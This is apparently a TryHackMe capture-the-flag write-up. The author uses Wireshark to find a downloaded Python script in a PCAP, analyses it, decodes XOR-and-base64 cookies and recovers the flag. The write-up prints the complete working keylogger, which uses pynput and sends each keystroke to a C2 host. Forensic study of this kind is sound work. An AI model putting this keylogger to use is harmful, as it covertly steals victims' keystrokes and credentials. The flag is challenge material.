# Packed Light

Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data equivalent of a hotel towel every night, folded neatly inside traffic that looks ordinary until you decode it.

After downloading the provided PCAP file, I opened it in **Wireshark** to inspect the captured network traffic.

My first step was to identify any HTTP communication, so I applied the following display filter:

```
http.request
```

Among the HTTP requests, I found a suspicious GET request:

```
GET /temp/updates.py HTTP/1.1
```

This immediately stood out because it was requesting a Python script from the server.

To inspect the response, I selected the corresponding **HTTP/1.1 200 OK** response packet. The Python source code was visible in the **Packet Bytes** and **Packet Details** panes. A more convenient way to view the complete script is:

- Right-click the HTTP response packet.
- Select **Follow → HTTP Stream**.
- This reconstructs the entire HTTP conversation and displays the Python script in a readable format.

Another option is:

- **File → Export Objects → HTTP**
- Save the downloaded object (`updates.py`) and open it in a text editor or IDE.

The recovered Python script is shown below:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))

    b64_string = base64.b64encode(encrypted).decode('utf-8')

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }

    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

## Script Analysis

From the script, it becomes clear that this is a **Python keylogger**. It uses the `pynput` library to monitor every key pressed by the victim.

Each captured character is:

1. Converted to UTF-8 bytes.
2. XOR encrypted using the key:
    
    ```
    H0t3lSt@ff0NlyK3epS3cr3t!
    ```
    
3. Base64 encoded.
4. Sent to the command-and-control (C2) server inside the `hotel_sess_state` HTTP cookie.

The C2 server configured in the malware is:

```
http://byte-lotus-hotel.thm:8080/
```

The important part of the code is:

```python
headers = {
    "Cookie": f"hotel_sess_state={b64_string}"
}
```

This tells us that every HTTP request contains one encoded keystroke inside the `hotel_sess_state` cookie.

## Recovering the Exfiltrated Data

To recover the stolen keystrokes, I filtered the HTTP requests and examined the `Cookie` header. The values looked similar to:

```
hotel_sess_state=HA==
hotel_sess_state=AA==
hotel_sess_state=BQ==
...
```

Each value represents one encrypted character.

To decode them:

1. Base64 decode the cookie value.
2. XOR the resulting byte with the first byte of the XOR key (`'H'`, hexadecimal `0x48`), since each request contains only a single character.
3. Convert the resulting byte back to its ASCII character.

Repeating this process for every captured cookie reconstructs the complete message.

The recovered flag is:

```
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```